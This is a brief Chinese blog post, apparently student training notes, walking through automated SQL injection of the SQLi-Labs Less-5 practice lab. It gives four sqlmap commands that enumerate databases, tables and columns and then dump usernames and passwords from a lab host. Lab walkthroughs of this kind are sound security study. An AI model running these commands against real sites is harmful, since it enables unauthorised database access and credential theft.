---
title: "使用Sqlmap自动化注入SQLi-Labs Less-5"
published: 2025-01-01
description: "使用Sqlmap工具对SQLi-Labs Less-5关卡进行自动化SQL注入，快速获取数据库、表、字段和数据内容。"
tags: ["Sqlmap", "SQL注入", "SQLi-Labs", "自动化", "Web安全"]
category: "大三下实训"
---

用sqlmap爆破sql注入less-5

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" –dbs

![图片](./images/jr4_sqlmap_img1.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security –tables

![图片](./images/jr4_sqlmap_img2.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security -T users –columns

![图片](./images/jr4_sqlmap_img3.png)

python sqlmap.py -u "http://192.168.214.142/sql/Less-5/?id=1" -D security -T users -C username,password –dump

![图片](./images/jr4_sqlmap_img4.png)
